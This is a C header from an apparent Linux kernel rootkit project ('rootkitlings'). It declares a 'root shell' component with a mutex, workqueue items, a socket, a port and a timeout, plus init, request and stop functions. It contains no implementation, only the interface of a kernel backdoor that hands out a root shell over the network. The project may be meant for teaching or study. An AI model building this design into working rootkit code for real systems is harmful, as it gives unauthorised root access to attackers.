/* SPDX-License-Identifier: GPL-2.0 */
#ifndef ROOTKITLINGS_ROOT_SHELL_H
#define ROOTKITLINGS_ROOT_SHELL_H

#include <linux/compiler_attributes.h>
#include <linux/mutex.h>
#include <linux/types.h>
#include <linux/workqueue.h>

struct file;
struct pid;
struct socket;

struct rk_root_shell {
	struct mutex lock;
	struct work_struct work;
	struct delayed_work timeout_work;
	struct socket *socket;
	struct file *file;
	struct pid *leader;
	u16 port;
	unsigned int timeout_ms;
	bool initialized;
	bool busy;
	bool stopping;
	bool timed_out;
	int result;
};

__must_check int rk_root_shell_init(struct rk_root_shell *shell,
				    unsigned int timeout_ms);
__must_check int rk_root_shell_request(struct rk_root_shell *shell, u16 port);
void rk_root_shell_stop(struct rk_root_shell *shell);

#endif
